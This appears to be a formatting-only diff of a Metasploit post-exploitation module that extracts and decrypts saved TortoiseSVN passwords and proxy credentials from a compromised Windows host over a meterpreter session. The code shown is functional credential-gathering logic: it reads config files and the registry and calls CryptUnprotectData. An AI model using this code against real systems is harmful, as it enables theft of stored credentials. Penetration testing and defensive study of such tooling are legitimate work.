@@ -3,26 +3,28 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather TortoiseSVN Saved Password Extraction',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather TortoiseSVN Saved Password Extraction',
+        'Description' => %q{
           This module extracts and decrypts saved TortoiseSVN passwords.  In
           order for decryption to be successful this module must be executed
           under the same privileges as the user which originally encrypted the
           password.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Justin Cacak'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Justin Cacak'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
 
   def prepare_railgun
@@ -40,7 +42,7 @@ class MetasploitModule < Msf::Post
     mem = process.memory.allocate(128)
     process.memory.write(mem, data)
 
-    if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
+    if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
       addr = [mem].pack("V")
       len = [data.length].pack("V")
       ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
@@ -53,6 +55,7 @@ class MetasploitModule < Msf::Post
     end
 
     return "" if len == 0
+
     decrypted_pw = process.memory.read(addr, len)
     return decrypted_pw
   end
@@ -67,7 +70,7 @@ class MetasploitModule < Msf::Post
     else
       # A proxy with password is utilized, gather details
       print_good("HTTP Proxy Settings")
-      http_proxy_username= registry_getvaldata("#{@key_base}", 'http-proxy-username')
+      http_proxy_username = registry_getvaldata("#{@key_base}", 'http-proxy-username')
       http_proxy_host = registry_getvaldata("#{@key_base}", 'http-proxy-host')
       http_proxy_port = registry_getvaldata("#{@key_base}", 'http-proxy-port')
 
@@ -93,7 +96,6 @@ class MetasploitModule < Msf::Post
       user: http_proxy_username,
       password: http_proxy_password
     )
-
   end
 
   def get_config_files
@@ -105,7 +107,8 @@ class MetasploitModule < Msf::Post
     begin
       session.fs.dir.foreach(path) do |file_name|
         next if file_name == "." or file_name == ".."
-        savedpwds = analyze_file(path+file_name)
+
+        savedpwds = analyze_file(path + file_name)
       end
     rescue => e
       print_error "Exception raised: #{e.message}"
@@ -116,7 +119,6 @@ class MetasploitModule < Msf::Post
     if savedpwds == 0
       print_status("No configuration files located")
     end
-
   end
 
   def report_cred(opts)
@@ -146,7 +148,6 @@ class MetasploitModule < Msf::Post
     create_credential_login(login_data)
   end
 
-
   def analyze_file(filename)
     config = client.fs.file.new(filename, 'r')
     contents = config.read
@@ -166,25 +167,25 @@ class MetasploitModule < Msf::Post
           # Parse for output
           url = $1
           realm = $2
-          realm.gsub! "\r", ""   #Remove \r (not common)
+          realm.gsub! "\r", "" # Remove \r (not common)
           if line.match(/<(.*):\/\/(.*):(.*)>/)
             # Parse for reporting
             sname = $1
             host = $2
             portnum = $3
-            portnum.gsub! "\r", ""   #Remove \r (not common)
+            portnum.gsub! "\r", "" # Remove \r (not common)
           end
         else
           url = "<Unknown/Error>"
         end
       elsif line_num == 16
         user_name = line
-        user_name.gsub! "\r", ""  #Remove \r (not common)
+        user_name.gsub! "\r", "" # Remove \r (not common)
       end
     end
     config.close
 
-    #Handle null values or errors
+    # Handle null values or errors
     if user_name == nil
       user_name = "<Unknown/Error>"
     end
